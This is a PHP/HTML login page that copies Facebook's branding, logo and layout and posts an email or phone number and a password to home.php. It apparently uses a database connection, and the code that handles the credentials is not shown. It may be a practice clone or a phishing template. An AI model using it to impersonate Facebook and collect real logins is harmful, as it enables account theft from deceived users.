<?php
require 'connection.php';

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <main>
        <div class="row">
            <div class="col-logo">
                <img src="images/fb_logo.svg" alt="Logo">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div class="col-form">
                <div class="form-container">
                    <form action="home.php" method="post">
                    <input name="email" type="text" placeholder="Email address or phone number">
                    <input name="wordpass" type="password" placeholder="Password">
                    <input type="submit" id="sub" class="btn-login"></button>
                    <a href="forgotpassword.php">Forgotten password?</a>
                    </form>
                    <a href="createAccount.php"><button class="btn-new">Create new Account</button></b></a>
                </div>
                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
            </div>
        </div>
    </main>
    <footer>
        <div class="footer-contents">

            <center><p>Facebook © 2023</p></center>
        </div>
    </footer>
</body>

</html>